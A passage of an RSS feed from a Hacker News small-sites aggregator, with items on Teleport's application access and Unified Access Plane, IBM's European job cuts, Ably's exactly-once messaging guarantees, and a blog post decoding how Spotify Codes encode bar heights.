<p><code>teleport</code> behaves differently based on the command-line arguments or via a configuration file. It can run in several modes, also called roles. Combining them together allows you to tailor Teleport deployment to your needs:</p>

<ul>
<li><em>Proxy service</em>, if started as <code>teleport start --roles=proxy</code></li>
<li><em>An application access service,</em> if started as <code>teleport start --roles=app</code> (shown as â€œsidecarâ€ on the diagram)</li>
</ul>

<p>Hereâ€™s an example of how these services can work together to give developers seamless access to internal web apps with a single login:</p>

<p><img width="60%" src="https://goteleport.com/blog/images/2020/application-access-announcement-2.png" alt="how a proxy service and application access service work together"></p>

<p>Letâ€™s consider how connectivity is established first, and then weâ€™ll cover authentication.</p>

<h3 id="connectivity">Connectivity</h3>

<p>The diagram above is self-explanatory:</p>

<ul>
<li>A Teleport Proxy service must be running somewhere and exposed to the public internet. The proxy is the single access point that can be used to access applications anywhere. The proxy is not a single point of failure as you can have several copies behind a network load-balancer or via a DNS split.</li>
<li>Each private network needs to run a copy of <code>teleport</code> running with <code>--roles=app</code>. This process is a sidecar, which creates an encrypted outbound tunnel to the Teleport proxy. The tunnel is permanent, and if the proxy becomes unavailable, or if the Internet connectivity is not reliable, the sidecar will be trying to reconnect when possible.</li>
<li>Each app gets a DNS name issued by the proxy, so if the proxy is running on <code>proxy.example.com</code>, you may have Jenkins available as <code>jenkins.proxy.example.com</code>. This DNS name also points at the proxy.</li>
<li>When a user tries to access <code>jenkins.proxy.example.com</code>, their request will be proxied through the suitable tunnel to the sidecar responsible for this app, and from there a connection to the actual Jenkins instance will be made.</li>
</ul>

<p>This architecture is fairly flexible, as it allows users to have sidecars running inside their networks, proxying access to all applications on that network. They can also be bundled with applications (inside the same Kubernetes pod, for example), so the apps can be configured to only listen on <code>localhost</code>. This guarantees that the only way to access an application is via the Teleport proxy.</p>

<h3 id="authentication">Authentication</h3>

<p>Obviously, the proxy is protected. Teleport supports multiple authentication methods:</p>

<ul>
<li><em>The local database of users with MFA</em>. This is suitable for quick experimentation and as a â€œPlan Bâ€ when other methods are not available.</li>
<li><em>Popular public identity providers</em> such as Github and Google, so you can configure the proxy to trust a certain Github team or a Google Apps group.</li>
<li><em>Corporate SSO</em> logins via SAML. Examples include Active Directory, Okta, Auth0, OneLogin, and so on.</li>
</ul>

<p>The identity of users is passed to applications via HTTP headers. If an application is capable of understanding this information, it will not present its own login screen. But even if an application is not built to understand such headers, users will have to login again using in-app authentication. Itâ€™s worth noting that Teleport proxy, when integrated with SSO, usually bothers users with a login just once per day, and most legacy apps offer â€œremember meâ€ functionality, so the double-login for most use cases is not an issue.</p>

<h2 id="who-is-application-access-for">Who is Application Access for?</h2>

<p>Teleport Application access is naturally a great capability boost for existing Teleport users, whoâ€™re using it to get instant SSH to their environments. As a developer, a single login once per day should give you auto-expiring credentials for everything you need to be productive, be it a Jenkins instance, or Kubernetes clusters, or SSH nodes.</p>

<p>Teleport Application Access gives security professionals easy access controls to internal apps, so achieving FedRAMP compliance even for legacy internal applications becomes quite easy.</p>

<p>But even as a hobbyist, I have been enjoying having access to my Synology home NAS or to my printerâ€™s web UI on the go!</p>

<h2 id="other-improvements">Other Improvements</h2>

<p>Teleport 5.0 comes with improved Kubernetes Access. In addition to connecting SSH nodes to a Teleport cluster, users can now configure Teleport to provide access to multiple Kubernetes clusters running behind NAT. This brings all three types of access to an equal footing:</p>

<ul>
<li>SSH Access</li>
<li>Application Access</li>
<li>Kubernetes Access</li>
</ul>

<p>The end result is an engineer getting access to all three with a single login.</p>

<h2 id="the-future-of-teleport">The Future of Teleport</h2>

<p>Traditionally, open source projects of similar architecture were called â€œproxies,â€ or simply â€œserversâ€, as in SSH server. Such a description never felt right for Teleport because its mission is to provide instant <em>access for engineers to any computing resource anywhere in the world</em>. Calling it a server or a proxy did not feel right, as its purpose was to remove machine and network boundaries and create an illusion of all computing resources being in the same â€œroomâ€ as an engineer.</p>

<p>Starting with version 5.0, Teleport will be known as a <strong>Unified Access Plane</strong>. Greg Chase, who runs our Product Marketing function, coined the term. It fits perfectly with our vision of erasing access boundaries between computing resources and environments.</p>

<p>The cloud has largely replaced the notion of a â€œcomputerâ€ for most developers, as we create programs to run â€œin the cloudâ€ now. The cloud is a collection of geographically scattered production environments, each consisting of ever-growing in height tech stacks. It is, essentially, a single-purpose, custom â€œcomputerâ€ that we build from virtual parts supplied by the cloud providers. This computer currently lacks an operating system or standardization of any kind and weâ€™re still stitching together solutions from good ole days to run our stuff on it, including remote access solutions. The list of â€œcomputer componentsâ€ is long and each component currently comes with its own remote access facility: SSH, RDP, K8s API, databases, internal dashboards, etc. Ending this fragmentation is what Teleport is about.</p>

<blockquote>
<p>Teleport Unified Access planeâ€™s purpose is to be a single remote access to this â€œcloud computerâ€, for all environments and all protocols.</p>
</blockquote>

<p>If youâ€™ll be <a href="https://goteleport.com/get-started/">downloading Teleport</a> for the first time today, I figured you should be aware that youâ€™re trying something new and truly special, and you should be aware that support for other protocols is in the works, with some just around the corner.</p>

<p>Also, consider subscribing to our newsletter below. We make a good effort to make it interesting for engineers, which is easy because we are in the middle of a massive shift in remote access technology.</p>


        
        
        <p><strong>Related Posts</strong></p>
          <ul>
            
            <li><a href="https://goteleport.com/blog/gravitational-is-teleport/">Gravitational Changes Name to Teleport</a></li>
            
            <li><a href="https://goteleport.com/blog/teleport-5-press-release/">Teleport 5.0 Press Release</a></li>
            
            <li><a href="https://goteleport.com/blog/kelseyproject-beyonce-of-engineering/">Kelsey Hightower and Diversity at Teleport</a></li>
            
          </ul>
        

        
        
        <a href="https://goteleport.com/tags/company/">company</a>
        

      
      
      &nbsp;
      </article></div>]]>
            </description>
            <link>https://goteleport.com/blog/application-access-announcement/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151232</guid>
            <pubDate>Thu, 19 Nov 2020 16:39:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IBM to cut 8000 jobs in Europe, including up to 2000 in the UK and Ireland]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151162">thread link</a>) | @st1x7
<br/>
November 19, 2020 | https://www.channelpartnerinsight.com/news/4023598/ibm-cut-jobs-europe-uk-ireland | <a href="https://web.archive.org/web/*/https://www.channelpartnerinsight.com/news/4023598/ibm-cut-jobs-europe-uk-ireland">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<header>
<div>
<div>
<div>
<div>

<p>

<h2>CPI has learned that Arvind Krishnaâ€™s shake-up of Big-Blue to mean 8,000 roles are to be axed</h2>
</p>
</div>
</div>
</div>
</div>
</header>
<div>
<main role="main">
<div>
<article>

<div>
<figure>
<img alt="IBM to cut 8,000 jobs in Europe, including up to 2,000 in the UK and Ireland - source" title="" src="https://www.channelpartnerinsight.com/api/v1/wps/35f3af5/20d29633-4ec2-4994-97a7-4ec62f7e1ce3/9/axe-chopping-wood-580x358.jpg">
</figure>


<p>
IBM is poised to cut 8,000 jobs across its European operations next year, including up to 2,000 jobs in its UK and Ireland business, a source close to the matter has told CPI. Cuts in IBM France and IBM Italy are also expected to be announced to the regional country HQs. Channel Partner Insight reported last month that IBM had already informed IBM Germany of its intentions to cut around 2,300 jobs in that market. IBM's intentions to slim down comes a month after CEO Arvind Krishna told investors...
</p>
</div>
</article>
</div>

</main>
</div>
<div>
<section>
<div>
<div>
<section>
<p>
<h2>To continue reading...</h2>
</p>
</section>
<div>

<div>
<div>
<h2>Register now</h2>
<p>CPI helps European and US resellers, MSPs and distributors make smarter business decisions - such as what segments and territories to target - by providing original insights on who is successfully innovating and where the next market shifts will come from.</p>
<p>Registrants receive:</p>
<ul>
<li><strong>NEWS</strong>: find out whatâ€™s happening in the European channel and US MSP sector with our daily newsletter</li>
<li><strong>INTERVIEWS</strong>: learn how leading and â€˜rising starâ€™ executives are building their businesses</li>
<li><strong>TOP 30 DISTRIBUTORS</strong>: benchmark your business against the best</li>
<li><strong>COUNTRY/REGIONAL PROFILES</strong>: discover the latest trends in key territories</li>
<li><strong>MARKET ANALYSIS</strong>: help shape your strategy with the latest insights on what segments and services and growing, and whatâ€™s in decline</li>
</ul>
<p><a href="https://payments.incisivemedia.com/cpi/controlled/?_ga=2.35482145.1042959336.1583929074-2081328589.1545225057">Register now</a></p>
</div>
</div>
</div>
</div>
</div>
</section>
</div>

</div></div>]]>
            </description>
            <link>https://www.channelpartnerinsight.com/news/4023598/ibm-cut-jobs-europe-uk-ireland</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151162</guid>
            <pubDate>Thu, 19 Nov 2020 16:34:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Achieving exactly-once message processing with Ably]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151148">thread link</a>) | @matt_oriordan
<br/>
November 19, 2020 | https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/ | <a href="https://web.archive.org/web/*/https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<section>
<div>
<p>Exactly-once is a desirable (if not critical) message delivery guarantee and a remarkably complex engineering challenge to solve. In this blog post, we will look at what exactly-once means in the context of distributed pub/sub systems, and the exactly-once guarantees that the <a href="https://www.ably.io/">Ably</a> realtime pub/sub messaging platform provides. Ably often acts as the broker in data streaming pipelines: publishers send messages to our platform, and we deliver these messages to subscribers. As a broker, Ably provides regional &amp; global fault tolerance, which ensures message availability and survivability. We also offer a set of capabilities via SDKs that enable clients to use idempotent publishing, and recover in the event of a failure while resuming precisely where they left off, with no lost or duplicate messages.</p>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png"></figure><h2 id="exactly-once-delivery-is-one-of-the-hardest-engineering-challenges">Exactly-once delivery is one of the hardest engineering challenges<br>
</h2>
<p>In the context of distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems, exactly-once is a popular concept and a desirable, if not critical, system property. It also leads to confusion and diverging opinions within the development community. On the one hand, some argue that <a href="https://bravenewgeek.com/you-cannot-have-exactly-once-delivery/">exactly-once is simply unachievable.</a> On the other hand, there are systems such as <a href="https://kafka.apache.org/documentation/#semantics">Kafka that claim to support exactly-once semantics</a>. </p>
<p>We believe that a lot of the confusion around the concept has to do with the fact that there's no clear definition of what exactly-once actually means. It's arguably impossible to come up with a definition to satisfy everyone and every use case. That's because exactly-once can mean different things for different systems and different use cases. Regardless of how you look at it, though, exactly-once is, without a doubt, a distinctively complex engineering challenge. </p>
<p>Letâ€™s now define what exactly-once means for Ably in particular. In our case, exactly-once is a guarantee that once acknowledged, a message published to Ably is <strong>delivered</strong> to a consumer precisely once, even in the context of individual system components failing. Note that most often, Ably is used to deliver messages in real time directly to end-user devices.</p>
<p>Itâ€™s crucial to mention that exactly-once is a system-wide property, and you only achieve it if all the constituent components play their part. This doesnâ€™t mean that all the components must display exactly-once characteristics. For example, in our case, you can have a publisher that displays at-least-once behaviour. However, Ably provides an idempotent interface, which cancels out the fact that the producer may occasionally publish messages more than once. As long as at the other end of the pub/sub pipeline each message is delivered to subscribers precisely once, exactly-once behaviour is achieved as a whole.</p>
<h3 id="types-of-messaging-semantics">Types of messaging semantics<br>
</h3>
<p>Before we dive deeper into exactly-once delivery, letâ€™s review the main types of messaging semantics. When a system is fully operational and working as intended, exactly-once delivery is the behaviour you generally expect. However, we must also consider how faults in the pub/sub system or, indeed, clients affect this behaviour. While most components fail independently in a distributed pub/sub system, without directly impacting other components, the overall quality of service can be affected. Depending on how the system behaves when failures do occur, you get several different types of messaging semantics:</p>
<ul>
<li>
<strong>At-most-once semantics</strong>. The easiest type of semantics to achieve, from an engineering complexity perspective, since it can be done in a fire-and-forget way. There's rarely any need for the components of the system to be stateful. While it's the easiest to achieve, at-most-once is also the least desirable type of messaging semantics. It provides no absolute message delivery guarantees since each message is delivered once (best case scenario) or not at all.</li>
<li>
<strong>At-least-once semantics. </strong>This is an improvement on at-most-once semantics. There might be multiple attempts at delivering a message, so at least one attempt is successful. In other words, there's a chance messages may be duplicated, but they can't be lost. While not ideal as a system-wide characteristic, at-least-once semantics are good enough for use cases where duplication of data is of little concern, or scenarios where deduplication is possible on the consumer side.</li>
<li>
<strong>Exactly-once semantics</strong>. The ultimate message delivery guarantee and the optimal choice in terms of data integrity. As its name suggests, exactly-once semantics means that each message is delivered precisely once. The message can neither be lost nor delivered twice (or more times). Exactly-once is by far the most dependable message delivery guarantee. Itâ€™s also the hardest to achieve.</li>
</ul>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif" alt="Overview of message delivery semantics: at-most-once delivery, at-least-once delivery, exactly-once delivery."><figcaption>High-level overview of message delivery semantics</figcaption></figure><p>What most distributed pub/sub systems can genuinely guarantee is <strong>mostly-once </strong>delivery. This means that when the system is functioning as intended, messages are delivered exactly once. However, when failures are involved, thereâ€™s always a chance some messages will be delivered either at-most-once or at-least-once.</p>
<h3 id="failures-that-prevent-exactly-once-delivery">Failures that prevent exactly-once delivery<br>
</h3>
<p>To demonstrate just how hard it is for distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems to achieve exactly-once semantics, we must talk about failuresâ€”specifically, components that can fail and how these failures can be mitigated.<br></p>
<p><strong>Publisher failure</strong></p>
<p>When a publisher fails, some sort of recovery process takes place. Depending on its design, after recovery, the publisher may reattempt to publish a message that has already been sent to and acknowledged by the broker. In such an event, the publisher failure causes at-least-once behaviour. Another scenario is that the publisherâ€™s recovery procedure fails to realise that the publish attempt failed, which leads to at-most-once behaviour. </p>
<p>A strategy often used after a publish failure is to retry publishing the same message a fixed number of times. This is a pragmatic approach, but unsatisfactory in the context of exactly-once. Imagine that the publisher recovers and unsuccessfully tries to republish the same message five times, and then gives up. Practically none of the three semantics is achieved. To mitigate publisher failures Ably supports <a href="https://www.ably.io/topic/idempotency">idempotent publishing</a>, which ensures that regardless of how many times the same message is published to Ably, it will be delivered to subscribers exactly-once. <br></p>
<p><strong>Broker failure</strong></p>
<p>A broker failure has the potential to lead to all sorts of issues, including data loss. Thatâ€™s why itâ€™s recommended to design your system around the idea of mitigating or preventing loss of data. From a producer perspective, this could mean having the ability to publish messages at-least-once, so they can be resent to the broker if needed. </p>
<p>From a broker perspective (Ably included), letâ€™s start by reviewing what a message ACK means. Obviously, itâ€™s an acknowledgment that a published message has been received. Additionally, it should also imply that no subsequent failure will result in that message not being delivered to subscribers. In other words, it should be an acknowledgment that the broker provides sufficient redundancy to ensure continuity of service and onwards processing, even in the context of multiple infrastructure failures. Of course, nothing can be done to prevent or mitigate certain types of critical failures. When that happens, the sensible thing for the broker to do is to respond with a failure response (with HTTP, this is typically a 5xx status code), indicating clearly to the producer that the publish attempt was unsuccessful. </p>
<p><strong>Subscriber failure</strong></p>
<p>The most common subscriber failure that prevents exactly-once delivery involves short disconnections. For example, a client app on a mobile device will disconnect and quickly reconnect when the user switches from a mobile data network to a Wi-Fi network or goes through a tunnel. To counter this scenario and ensure exactly-once behaviour, the stream of messages must resume precisely where it left off when the subscriber recovers. For this to be possible, the connection state must be persisted and resynced when the subscriber reconnects.</p>
<p>If the broker is the one keeping track of the last message sent, you are unlikely to provide exactly-once semantics. Thatâ€™s because a broker might send a message, and the subscriber might successfully receive it and then disconnect before sending an ACK to the broker. In such a case, once the subscriber reconnects, the broker will resend the respective message (at-least-once semantics) since it has no way of knowing that the subscriber had received it before disconnecting.</p>
<p>To ensure exactly-once behaviour, the responsibility of keeping track of the last message received should sit with the subscriber - something we also do at Ably, via serial numbers. This way, when the subscriber reconnects, it notifies the broker of the last message it has received so that the stream can be accurately resumed from a point in time.</p>
<h3 id="exactly-once-semantics-use-cases">Exactly-once semantics use cases</h3>
<p>In the world of distributed pub/sub systems, exactly-once semantics has been and continues to be extremely hard to achieve. Equally, almost everywhere you look in software development, exactly-once is a highly desirable system-wide property, if not an essential one. For example, exactly-once is crucial for most transactional messaging use cases. At its core, a transactional message is triggered by a consumer action, and it usually includes necessary or high-priority info, e.g., a bank balance inquiry or an order confirmation. </p>
<p>Ordered operations represent another use case where exactly-once is fundamental. Letâ€™s say you want to use <a href="https://www.ably.io/blog/message-delta-compression/">delta compression</a> to only stream changes from the previous message to subscribers each time thereâ€™s an update. To achieve this, you need to use a transport that ensures data integrity through guaranteed message ordering and exactly-once semantics.</p>
<p>If not crucial, exactly-once is at least highly desirable, because it improves overall system predictability and provides better experiences to users in general. For example, â€¦</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/">https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/</a></em></p>]]>
            </description>
            <link>https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151148</guid>
            <pubDate>Thu, 19 Nov 2020 16:33:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How do Spotify Codes work?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151100">thread link</a>) | @sciurus
<br/>
November 19, 2020 | https://boonepeter.github.io/posts/2020-11-10-spotify-codes/ | <a href="https://web.archive.org/web/*/https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p><a href="https://www.spotifycodes.com/">Spotify Codes</a> are QR-like codes that can be generated to easily share Spotify songs, artists, playlists, and users. I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Letâ€™s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song â€œTake a Chance on Meâ€ has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album â€œThe Albumâ€ has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>
</code></pre></div><p>To illustrate that number:</p><div><pre><code data-lang="python">x <span>=</span> <span>62</span> <span>**</span> <span>22</span>
<span># the number of milliseconds in a year</span>
x <span>//=</span> <span>365</span> <span>*</span> <span>24</span> <span>*</span> <span>60</span> <span>*</span> <span>60</span> <span>*</span> <span>1000</span>
<span># the number of words in the bible (about 1 million)</span>
x <span>//=</span> <span>1000000</span>
</code></pre></div><p>If Spotify printed a whole Bibleâ€™s worth of URIs every millisecond they could do this for <code>85,863,890,404,701,306,452,633</code> years. Safe to say Spotify is not going to run out of URIs anytime soon.</p><h2 id="barcode-background">Barcode background</h2><p>The <a href="https://en.wikipedia.org/wiki/Barcode">history of barcodes</a> is quite extensive. Information is encoded into different barcodes in a variety of ways.</p><p>A lot of barcodes encode data in the <strong>widths</strong> of vertical bars. Universal product codes (UPCs) encode 12 digits using combinations of vertical bars of different widths:</p><p><img src="https://boonepeter.github.io/imgs/spotify/upc.png" alt="UPC encodings"></p><p><a href="https://en.wikipedia.org/wiki/KarTrak">Another barcode</a> uses colors to encode data:</p><p><img src="https://boonepeter.github.io/imgs/spotify/KarTrak_ACI_codes.svg.png" alt="Kartrack barcode"></p><p><a href="https://en.wikipedia.org/wiki/QR_code">QR codes</a> use a 2d matrix of dots to encode data.</p><p><img src="https://boonepeter.github.io/imgs/spotify/qr_code.png" alt="QR code"></p><p>A lot of mail barcodes encode data using the <strong>height</strong> of the bars (like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail barcode</a>).</p><p><img src="https://boonepeter.github.io/imgs/spotify/intelligent_mail_barcode.png" alt="Intelligent mail barcode"></p><h2 id="spotify-codes">Spotify Codes</h2><p>Spotify codes work like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail Barcode</a>. Information can be stored in the bars by setting them to different heights.</p><p>This is the Spotify code for the ABBA song â€œTake a Chance on Meâ€:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p>When the bars are sorted by height you can see that there are 8 discrete heights that they fall into.</p><p><img src="https://boonepeter.github.io/imgs/spotify/sorted.png" alt="Spotify sorted barcodes"></p><p>This means the data is encoded in <a href="https://en.wikipedia.org/wiki/Octal">octal</a>.</p><p>The Spotify logoâ€™s diameter is the same as the height of the highest bar. This makes it easy to generate ratios of the bars' heights.</p><p>In this function I use <a href="https://scikit-image.org/">scikit-image</a> to calculate the sequence of bar heights from a logo.</p><div><pre><code data-lang="python"><span>from</span> skimage <span>import</span> io
<span>from</span> skimage.measure <span>import</span> label, regionprops
<span>from</span> skimage.filters <span>import</span> threshold_otsu
<span>from</span> skimage.color <span>import</span> rgb2gray


<span>def</span> <span>get_heights</span>(filename: str) <span>-&gt;</span> list:
    <span>"""Open an image and return a list of the bar heights.
</span><span>    """</span>
    <span># convert to grayscale, then binary</span>
    image <span>=</span> io<span>.</span>imread(filename)
    im <span>=</span> rgb2gray(image)
    binary_im <span>=</span> im <span>&gt;</span> threshold_otsu(im)

    <span># label connected regions as objects</span>
    labeled <span>=</span> label(binary_im)

    <span># get the dimensions and positions of bounding box around objects</span>
    bar_dimensions <span>=</span> [r<span>.</span>bbox <span>for</span> r <span>in</span> regionprops(labeled)]

    <span># sort by X</span>
    bar_dimensions<span>.</span>sort(key<span>=</span><span>lambda</span> x: x[<span>1</span>], reverse<span>=</span>False)

    <span># the first object (spotify logo) is the max height of the bars</span>
    logo <span>=</span> bar_dimensions[<span>0</span>]
    max_height <span>=</span> logo[<span>2</span>] <span>-</span> logo[<span>0</span>]
    sequence <span>=</span> []
    <span>for</span> bar <span>in</span> bar_dimensions[<span>1</span>:]:
        height <span>=</span> bar[<span>2</span>] <span>-</span> bar[<span>0</span>]
        ratio <span>=</span> height <span>/</span> max_height
        <span># multiply by 8 to get an octal integer</span>
        ratio <span>*=</span> <span>8</span>
        ratio <span>//=</span> <span>1</span>
        <span># convert to integer (and make 0 based)</span>
        sequence<span>.</span>append(int(ratio <span>-</span> <span>1</span>))
    <span>return</span> sequence
</code></pre></div><p>This is the sequence of the â€œTake On Meâ€ Spotify code:</p><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> get_heights(<span>"/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg"</span>)
[<span>0</span>, <span>5</span>, <span>1</span>, <span>2</span>, <span>0</span>, <span>6</span>, <span>4</span>, <span>3</span>, <span>7</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>3</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>0</span>]
</code></pre></div><p>Here are those results overlaid on the barcode:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_labeled.png" alt="labeled spotify code"></p><p>After looking at a few barcodes, I realized that the first and last bars are always 0, and the 12th bar is always a 7. This must help in identifying if the barcode is valid. Having the 12th bar as the max height also helps you calculate the ratios of the bar heights. I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave. Here are a few barcodes printed out so you can see that the first and last are always equal to 0 and the 12th is equal to 7.</p><div><pre><code data-lang="python">    [<span>0</span>, <span>3</span>, <span>3</span>, <span>0</span>, <span>5</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>5</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>5</span>, <span>0</span>]
    [<span>0</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>3</span>, <span>5</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>2</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>6</span>, <span>0</span>]
    [<span>0</span>, <span>4</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>6</span>, <span>0</span>, <span>2</span>, <span>1</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>2</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>5</span>, <span>5</span>, <span>5</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>1</span>, <span>5</span>, <span>2</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>3</span>, <span>7</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>7</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>1</span>, <span>1</span>, <span>1</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>1</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>3</span>, <span>0</span>, <span>6</span>, <span>0</span>, <span>0</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>4</span>, <span>4</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>4</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>0</span>, <span>5</span>, <span>4</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>0</span>, <span>6</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>2</span>, <span>2</span>, <span>0</span>, <span>2</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>5</span>, <span>0</span>, <span>4</span>, <span>0</span>]
</code></pre></div><p>The barcode consists of 23 bars, of which only 20 actually contain information. This means that there are <code>8^20</code> pieces of information that can be encoded into the code.</p><h2 id="uris-to-barcodes">URIs to Barcodes</h2><p>How do you convert a <code>63^22</code> bit URI into an <code>8^20</code> bit barcode? There is <code>2.3e+21</code> times as much information in the URI than there is in the barcode. This is when I started asking questions and hunting for answers. <a href="https://stackoverflow.com/questions/47267924/string-encryption-generate-unique-pattern-like-spotify-codes/62120952#62120952">This question</a> was a start, but I ended up asking <a href="https://stackoverflow.com/questions/62121301/encoding-spotify-uri-to-spotify-codes">this SO question</a> and getting a couple of answers that linked to the relevant patents and contained more info about Spotifyâ€™s look up table.</p><p><a href="https://data.epo.org/publication-server/rest/v1.0/publication-dates/20190220/patents/EP3444755NWA1/document.pdf">Here is one patent</a>.</p><p><a href="http://www.freepatentsonline.com/20180181849.pdf">Here is another, more recent patent</a></p><blockquote><p>â€œPatents are the worstâ€ - Peter Boone</p></blockquote><p>Let me just say: patents are the worst. They are so dense. I used to think academic papers were full of jargon until I read some technical patents.</p><h3 id="the-process">The Process</h3><p>When you visit <a href="https://www.spotifycodes.com/">Spotify codes</a> and input a Spotify URI, a â€œmedia referenceâ€ is created by Spotify. This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotifyâ€™s database (a look-up table) to determine what URI it corresponds to. A Stack Overflow user <a href="https://stackoverflow.com/a/63479041/10703868">discovered</a> that you can sniff the request that your phone makes when scanning the barcode to determine the media reference and API endpoint.</p><div><pre><code data-lang="python">heights <span>=</span> [<span>0</span>, <span>2</span>, <span>6</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>0</span>]
media_reference <span>=</span> <span>"67775490487"</span>
uri <span>=</span> <span>"spotify:user:jimmylavallin:playlist:2hXLRTDrNa4rG1XyM0ngT1"</span>
